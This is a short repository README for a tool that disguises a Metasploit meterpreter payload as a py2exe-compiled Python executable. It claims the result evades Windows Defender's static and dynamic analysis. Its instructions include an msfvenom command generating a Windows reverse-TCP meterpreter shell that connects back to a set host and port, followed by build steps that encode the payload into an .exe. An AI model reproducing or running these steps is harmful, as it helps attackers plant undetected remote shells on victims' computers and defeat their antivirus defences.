## AV bypass generator for py2exe

![https://n0a.pw/content/images/2020/12/meter_run.png](https://n0a.pw/content/images/2020/12/meter_run.png)

This tool was written to generate .py files for compilation into an .exe file using py2exe. 
Testing has shown that meterpreter coded in this way successfully bypasses static and dynamic analysis of windows defender.
For build the .exe file, you need a Windows machine with Python 2.7 installed and the py2exe module.
Based on [pymemimporter](https://github.com/n1nj4sec/pymemimporter) that allows you to import any .pyd from memory with only pure python code (no .pyd)!

**Instruction**
- Download [python 2.7](https://www.python.org/download/releases/2.7/ )
- Download [py2exe for python 2.7](https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/py2exe-0.6.9.win32-py2.7.exe/download)
- Clone this repository: `git clone https://github.com/n0a/meterpreter-av-bypass`
- Make a payload: `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.0.180 LPORT=4433 -f exe > shell.exe`
- Generate build files: `./gen.sh shell.exe`
- Copy files from shell direcory to C:\Python27 on Windows machine.
- Run `make.bat`
- Your encoded payload in dist/shell.exe

**Для русскоязычной аудитории:** [**https://n0a.pw/meterpreter-av-bypass**](https://n0a.pw/meterpreter-av-bypass)